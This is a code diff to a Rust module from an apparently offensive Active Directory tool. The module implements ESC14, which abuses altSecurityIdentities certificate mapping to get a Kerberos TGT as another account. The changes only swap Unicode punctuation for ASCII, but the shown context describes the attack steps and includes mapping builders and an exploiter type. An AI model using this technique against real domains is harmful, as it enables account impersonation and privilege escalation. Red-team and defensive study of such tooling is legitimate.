@@ -1,4 +1,4 @@
-//! ESC14 — Certificate Mapping via `altSecurityIdentities` Abuse
+//! ESC14 -- Certificate Mapping via `altSecurityIdentities` Abuse
 //!
 //! ESC14 targets the Active Directory certificate-to-account mapping mechanism.
 //! When an attacker has **WriteAltSecurityIdentities** (or **GenericAll** /
@@ -20,7 +20,7 @@
 //! 3. Compute the X509 mapping string for the certificate (Issuer+Serial, SKI,
 //!    SHA1 hash, or RFC822 mapping).
 //! 4. Write the mapping value into the target's `altSecurityIdentities`.
-//! 5. Authenticate via PKINIT using the mapped certificate → obtain a TGT as
+//! 5. Authenticate via PKINIT using the mapped certificate -> obtain a TGT as
 //!    the target principal.
 //! 6. Clean up: restore the original `altSecurityIdentities` value.
 //!
@@ -29,9 +29,9 @@
 use crate::error::{OverthroneError, Result};
 use tracing::info;
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  Constants
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
 /// LDAP attribute for certificate-to-account mapping
 pub const ALT_SECURITY_IDENTITIES: &str = "altSecurityIdentities";
@@ -51,22 +51,22 @@ pub const X509_RFC822_PREFIX: &str = "X509:<RFC822>";
 /// Mapping prefix for Kerberos principal style
 pub const KERBEROS_PREFIX: &str = "Kerberos:";
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  Types
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
 /// The style of certificate mapping used in `altSecurityIdentities`
 #[derive(Debug, Clone, PartialEq)]
 pub enum MappingStyle {
-    /// `X509:<I>issuer<S>subject` — Issuer + Subject DN
+    /// `X509:<I>issuer<S>subject` -- Issuer + Subject DN
     IssuerSubject,
-    /// `X509:<I>issuer<SR>serialnumber` — Issuer + Serial (reversed hex)
+    /// `X509:<I>issuer<SR>serialnumber` -- Issuer + Serial (reversed hex)
     IssuerSerial,
-    /// `X509:<SKI>subjectkeyidentifier` — Subject Key Identifier
+    /// `X509:<SKI>subjectkeyidentifier` -- Subject Key Identifier
     SubjectKeyIdentifier,
-    /// `X509:<SHA1-PUKEY>hash` — SHA1 of the DER-encoded public key
+    /// `X509:<SHA1-PUKEY>hash` -- SHA1 of the DER-encoded public key
     Sha1PublicKey,
-    /// `X509:<RFC822>email` — RFC822 / UPN
+    /// `X509:<RFC822>email` -- RFC822 / UPN
     Rfc822,
 }
 
@@ -136,9 +136,9 @@ pub struct Esc14VulnerableTarget {
     pub high_value: bool,
 }
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  Mapping builders
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
 /// Build an `X509:<I>issuer<S>subject` mapping string from certificate DER
 pub fn build_issuer_subject_mapping(cert_der: &[u8]) -> Result<String> {
@@ -174,7 +174,7 @@ pub fn build_issuer_serial_mapping(cert_der: &[u8]) -> Result<String> {
         .collect();
 
     info!(
-        "ESC14: Certificate serial {} → reversed for mapping: {}",
+        "ESC14: Certificate serial {} -> reversed for mapping: {}",
         serial, reversed
     );
 
@@ -202,13 +202,13 @@ pub fn build_rfc822_mapping(upn: &str) -> String {
     format!("X509:<RFC822>{}", upn)
 }
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  LDAP operations
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
 /// Generate the LDAP filter to find accounts with writable
 /// `altSecurityIdentities` by a specific principal SID.
-/// This is a simplification — full ACL parsing requires SDDL analysis;
+/// This is a simplification -- full ACL parsing requires SDDL analysis;
 /// this filter finds accounts that already have the attribute populated.
 pub fn alt_security_identities_filter() -> &'static str {
     "(altSecurityIdentities=*)"
@@ -258,11 +258,11 @@ pub fn ldap_cleanup_command(target_dn: &str, mapping_value: &str, dc: &str, ldap
     )
 }
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  Exploiter
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
-/// ESC14 exploiter — `altSecurityIdentities` certificate mapping abuse
+/// ESC14 exploiter -- `altSecurityIdentities` certificate mapping abuse
 pub struct Esc14Exploiter;
 
 impl Esc14Exploiter {
